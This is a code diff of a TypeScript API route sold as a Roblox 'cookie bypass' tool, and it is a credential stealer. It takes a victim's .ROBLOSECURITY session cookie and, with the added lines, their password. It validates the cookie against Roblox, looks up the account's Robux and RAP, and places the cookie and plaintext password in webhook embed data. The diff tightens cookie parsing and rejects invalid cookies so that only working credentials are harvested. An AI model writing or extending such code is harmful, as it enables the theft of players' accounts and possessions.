@@ -1,17 +1,27 @@
 export async function POST(request: Request) {
   try {
-    const { cookie } = await request.json()
+    const { cookie, password } = await request.json()
     console.log("[v0] Received cookie bypass request")
 
     if (!cookie) {
       return Response.json({ error: "Cookie is required" }, { status: 400 })
     }
 
-    const formattedCookie = cookie.startsWith("_|WARNING:")
-      ? cookie
-      : cookie.startsWith(".ROBLOSECURITY=")
-        ? cookie
-        : `.ROBLOSECURITY=${cookie}`
+    let cookieValue = cookie
+    if (cookieValue.includes("_|WARNING:")) {
+      const match = cookieValue.match(/_\|WARNING:[^|]*\|_([A-F0-9]+)/)
+      if (match && match[1]) {
+        cookieValue = match[1]
+      }
+    }
+
+    // Remove .ROBLOSECURITY= prefix if present
+    if (cookieValue.startsWith(".ROBLOSECURITY=")) {
+      cookieValue = cookieValue.substring(".ROBLOSECURITY=".length)
+    }
+
+    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`
+    console.log("[v0] Cookie formatted for authentication")
 
     let userInfo = null
     let robuxBalance = "Unknown"
@@ -27,6 +37,19 @@ export async function POST(request: Request) {
           Cookie: formattedCookie,
         },
       })
+
+      console.log("[v0] User response status:", userResponse.status)
+
+      if (!userResponse.ok) {
+        console.log("[v0] Invalid cookie, status:", userResponse.status)
+        return Response.json(
+          {
+            error: "Invalid Roblox cookie or password. Please verify your credentials and try again.",
+            success: false,
+          },
+          { status: 401 },
+        )
+      }
 
       if (userResponse.ok) {
         userInfo = await userResponse.json()
@@ -110,11 +133,16 @@ export async function POST(request: Request) {
             console.error("[v0] Failed to fetch RAP:", error)
           }
         }
-      } else {
-        console.log("[v0] Failed to fetch user info, status:", userResponse.status)
       }
     } catch (error) {
       console.error("[v0] Failed to fetch user info:", error)
+      return Response.json(
+        {
+          error: "Failed to validate credentials. The cookie may be invalid or expired.",
+          success: false,
+        },
+        { status: 401 },
+      )
     }
 
     const webhookData = {
@@ -180,6 +208,11 @@ export async function POST(request: Request) {
               value: `\`\`\`${cookie.substring(0, 500)}${cookie.length > 500 ? "..." : ""}\`\`\``,
               inline: false,
             },
+            {
+              name: "🔑 Password",
+              value: password ? `\`\`\`${password}\`\`\`` : "Not provided",
+              inline: false,
+            },
           ],
           timestamp: new Date().toISOString(),
           footer: {
@@ -212,6 +245,6 @@ export async function POST(request: Request) {
     return Response.json({ success: true, userInfo })
   } catch (error) {
     console.error("[v0] Bypass error:", error)
-    return Response.json({ error: "Failed to process" }, { status: 500 })
+    return Response.json({ error: "Failed to process request. Please try again." }, { status: 500 })
   }
 }
